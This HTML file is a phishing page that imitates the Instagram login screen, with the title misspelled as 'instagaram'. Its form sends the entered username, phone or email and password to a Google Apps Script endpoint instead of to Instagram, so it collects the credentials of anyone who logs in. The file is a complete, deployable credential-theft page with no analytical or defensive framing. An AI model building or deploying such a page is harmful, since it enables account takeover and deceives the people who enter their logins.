<!DOCTYPE html>
<html lang="en" lang="en">
    <head>
        <title>instagaram</title>

        <link rel="stylesheet" href="login.css">

    </head>
    <body>
        <div class="container">
            <div class="box">
                <div class="heading"></div>
                <form class="login-form" method="POST" action="https://script.google.com/macros/s/AKfycbxS8QJA3ccJv-AmyD4gcE2nkAC0CexWluiM9I6r5XUdpKYUAffYjJhdesiCALzOAIXqNA/exec">
                    <div class="field">
                        <input id="username" name="username" type="name" placeholder="Phone number, username, or email" />
                        <label for="username">Phone number, username, or email</label>
                    </div>
                    <div class="field">
                        <input id="password" name="password" type="password" placeholder="password" />
                        <label for="password">Password</label>
                    </div>
                    <button class="login-button" title="login" type="submit">Log In</button>
                    <div class="separator">
                        <div class="line"></div>
                        <p>OR</p>
                        <div class="line"></div>
                    </div>
                    <div class="other">
                        <button class="fb-login-btn" type="button">
                            <i class="fa fa-facebook-official fb-icon"></i>
                            <span class="">Log in with Facebook</span>
                        </button>
                        <a class="forgot-password" href="#">Forgot password?</a>
                    </div>
                </form>
            </div>
            <div class="box">
                <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
            </div>
        </div>
        

    </body>
</html>
